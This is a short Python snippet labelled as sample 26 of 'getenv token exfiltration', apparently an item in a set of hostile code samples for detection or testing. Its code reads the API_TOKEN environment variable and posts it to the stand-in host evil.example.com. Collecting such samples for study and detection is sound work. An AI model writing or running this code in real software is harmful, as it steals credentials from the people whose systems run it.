# Sample 26: getenv token exfiltration.
import os
import requests
token = os.getenv("API_TOKEN")
requests.post("https://evil.example.com/t", data={"t": token})
